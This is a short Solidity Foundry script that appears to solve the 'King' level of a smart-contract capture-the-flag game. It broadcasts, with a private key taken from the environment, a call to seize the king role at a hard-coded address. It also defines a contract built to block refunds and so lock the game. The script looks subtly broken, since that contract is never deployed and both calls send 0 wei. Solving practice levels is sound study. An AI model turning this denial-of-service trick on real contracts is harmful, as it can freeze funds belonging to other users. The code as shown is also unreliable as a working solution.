// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "../src/level9King.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract LastKing {
    constructor(King _lastKing){
        address(_lastKing).call{value: 0 wei}("");
    }
}

contract Level9Solution is Script {
    King kingInstance =
        King(payable(0xFC87B2DC597CCdBf5764F28F2E8303a0ff244D07));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Old King : ", kingInstance._king());
        console.log(kingInstance.prize());

        (bool success, ) = address(kingInstance).call{value: 0 wei}("");
        if (success) {
            console.log("new King : ", kingInstance._king());
        }

        vm.stopBroadcast();
    }
}
